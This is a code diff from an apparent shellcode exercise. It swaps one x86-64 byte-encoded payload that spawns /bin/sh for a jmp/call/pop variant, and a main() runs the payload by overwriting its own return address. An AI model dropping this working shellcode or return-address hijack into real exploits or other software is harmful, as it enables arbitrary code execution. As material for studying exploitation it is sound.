@@ -35,24 +35,37 @@ char helloWorldCode[] = "\xeb\x20"	//jmp    4000a2 <_start+0x22>
 		"\x0d"	//.byte 0xd
 		"\x0a";	//.byte 0xa
 
-char shellSpawnCode[] = 	"\x48\x31\xff"	//xor    %rdi,%rdi
-		"\x57"	//push   %rdi
-		"\x57"	//push   %rdi
-		"\x5e"	//pop    %rsi
+char shellSpawnCode[] = "\xeb\x21"	//jmp    4000a3 <_start+0x23>
+		"\x48\x31\xc0"	//xor    %rax,%rax
+		"\x50"	//push   %rax
 		"\x5a"	//pop    %rdx
-		"\x48\xbf\x2f\x2f\x62\x69\x6e"	//movabs $0x68732f6e69622f2f,%rdi
-		"\x2f\x73\x68"	//400091:48 c1 ef 08      	shr    $0x8,%rdi
-		"\x57"	//push   %rdi
-		"\x54"	//push   %rsp
 		"\x5f"	//pop    %rdi
-		"\x6a\x3b"	//pushq  $0x3b
-		"\x58"	//pop    %rax
-		"\x0f\x05";	//syscall 
+		"\x50"	//push   %rax
+		"\x48\x89\xf8"	//mov    %rdi,%rax
+		"\x50"	//push   %rax
+		"\x54"	//push   %rsp
+		"\x5e"	//pop    %rsi
+		"\x48\x31\xc0"	//xor    %rax,%rax
+		"\xb0\x3b"	//mov    $0x3b,%al
+		"\x0f\x05"	//syscall 
+		"\x48\x31\xc0"	//xor    %rax,%rax
+		"\xb0\x3c"	//mov    $0x3c,%al
+		"\x48\x31\xff"	//xor    %rdi,%rdi
+		"\x40\xb7\x0a"	//mov    $0xa,%dil
+		"\x0f\x05"	//syscall 
+		"\xe8\xda\xff\xff\xff"	//callq  400082 <_start+0x2>
+		"\x2f"	//(bad)  
+		"\x62"	//(bad)  
+		"\x69"	//.byte 0x69
+		"\x6e"	//outsb  %ds:(%rsi),(%dx)
+		"\x2f"	//(bad)  
+		"\x73\x68";	//jae    400117 <_start+0x97>
+
 
 
 int main() {
 	int *ret;
-	//ret now points to the return address
+	//ret points to the return address now
 	ret =  (int *)&ret + 4; 
 	//let the return address contain the shellcode's location
 	(*ret) = (int)shellSpawnCode; 
